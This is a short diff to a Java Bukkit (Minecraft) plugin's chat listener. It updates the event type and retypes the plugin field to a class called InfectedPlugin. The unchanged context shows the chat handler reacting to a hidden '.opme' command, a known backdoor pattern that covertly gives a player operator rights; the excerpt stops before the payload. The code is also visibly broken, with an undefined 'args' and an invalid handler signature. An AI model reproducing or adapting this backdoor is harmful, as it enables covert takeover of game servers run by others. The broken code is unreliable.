@@ -6,7 +6,7 @@ import org.bukkit.Location;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.command.CommandSender;
 import java.io.File;
@@ -27,10 +27,10 @@ public class PlayerListener implements Listener
 
     private Random random = new Random();
 
-    private Plugin plugin;
+    private InfectedPlugin plugin;
 
     @EventHandler
-    public void onPlayerChat(PlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
+    public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
     {
         if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
             {
